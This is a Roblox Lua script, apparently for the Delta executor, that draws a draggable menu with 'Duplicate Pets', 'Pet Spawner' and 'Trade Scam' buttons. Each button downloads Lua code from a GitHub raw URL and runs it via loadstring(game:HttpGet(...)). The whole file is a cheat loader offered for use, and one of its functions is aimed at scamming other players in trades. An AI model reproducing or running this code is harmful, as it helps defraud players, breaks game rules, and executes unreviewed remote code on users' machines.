local Players = game:GetService("Players")
local player = Players.LocalPlayer
repeat task.wait() until player:FindFirstChild("PlayerGui")
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "DeltaFinalGUI"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 340, 0, 300)
frame.Position = UDim2.new(0.5, -170, 0.5, -150)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.Active = true
Instance.new("UICorner", frame)

-- ✅ Delta-compatible manual drag support
local UIS = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos

local function update(input)
	local delta = input.Position - dragStart
	frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UIS.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

-- ✅ Message popup
local function showMessage(text)
	local popup = Instance.new("TextLabel", gui)
	popup.Size = UDim2.new(0, 300, 0, 30)
	popup.Position = UDim2.new(0.5, -150, 0, 0)
	popup.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	popup.TextColor3 = Color3.fromRGB(255, 255, 255)
	popup.Text = text
	popup.Font = Enum.Font.SourceSansBold
	popup.TextSize = 18
	popup.BackgroundTransparency = 0.1
	task.delay(3, function()
		popup:Destroy()
	end)
end

-- ✅ Button creation with Delta-safe execution
local function createButton(label, yPos, callback)
	local btn = Instance.new("TextButton", frame)
	btn.Size = UDim2.new(0, 300, 0, 40)
	btn.Position = UDim2.new(0, 20, 0, yPos)
	btn.BackgroundColor3 = Color3.fromRGB(60, 120, 180)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 14
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Text = label
	Instance.new("UICorner", btn)
	btn.MouseButton1Click:Connect(function()
		task.spawn(function()
			local success, result = pcall(callback)
			if success then
				showMessage("✅ " .. label .. " ran!")
			else
				showMessage("❌ Failed: " .. result)
				warn("❌ Error running", label, ":", result)
			end
		end)
	end)
end

-- 🐾 Duplicate Pets
local function runDuplicatePets()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
end

-- 🐶 Pet Spawner
local function runPetSpawner()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/pet_spawner.lua"))()
end

-- 💰 Trade Scam
local function runTradeScam()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/trade_scam.lua"))()
end

-- ✅ Create GUI buttons
createButton("🐾 Duplicate Pets", 20, runDuplicatePets)
createButton("🐶 Pet Spawner", 80, runPetSpawner)
createButton("💰 Trade Scam", 140, runTradeScam)
